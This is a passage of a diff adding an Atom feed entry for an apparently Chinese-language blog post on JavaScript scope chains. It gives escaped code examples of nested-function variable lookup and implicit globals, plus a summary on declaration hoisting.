+&lt;h3 id=&quot;链式作用域&quot;&gt;&lt;a href=&quot;#链式作用域&quot; class=&quot;headerlink&quot; title=&quot;链式作用域&quot;&gt;&lt;/a&gt;链式作用域&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	function func_outer()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		var a=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		function func_inner()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			var a=3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			console.log(a);	//3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		func_inner();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	func_outer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	function func_outer()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		var a=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		function func_inner()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			console.log(a);	//2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		func_inner();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	func_outer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	function func_outer()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		function func_inner()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			console.log(a);	//1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		func_inner();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	func_outer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;当一个函数内部用到一个变量时，首先会在当前函数作用域中查找这个变量，如果当前函数作用域中没有，就逐层往上到上一级函数作用域中查找，一直找到window对象层，只到找到为止，如果找不到就会报变量未定义错误。这就是Javascript的链式作用域。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/yangdage/images/master/20160401/js-scope.jpg&quot; alt=&quot;js作用域&quot;&gt;&lt;/p&gt;
+&lt;p&gt;注意，任何函数内未加&lt;strong&gt;var&lt;/strong&gt;定义的变量，函数执行的时候都会被提升为全局变量。直属于&lt;strong&gt;window&lt;/strong&gt;对象，而且永驻内存不会被释放，除非手动删除，或关闭浏览器，window对象已有的该属性会被覆盖。&lt;/p&gt;
+&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	var a=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	function func_outer()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		a=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		function func_inner()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		func_inner();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	func_outer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	console.log(a);	//2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;声明提升的定义&quot;&gt;&lt;a href=&quot;#声明提升的定义&quot; class=&quot;headerlink&quot; title=&quot;声明提升的定义&quot;&gt;&lt;/a&gt;声明提升的定义&lt;/h3&gt;&lt;p&gt;声明提升就是将变量和函数的声明提升到作用域的顶端定义，&lt;strong&gt;但不赋值&lt;/strong&gt;。&lt;
+    
+    </summary>
+    
+      <category term="javascript" scheme="http://yoursite.com/categories/javascript/"/>
     
     
   </entry>
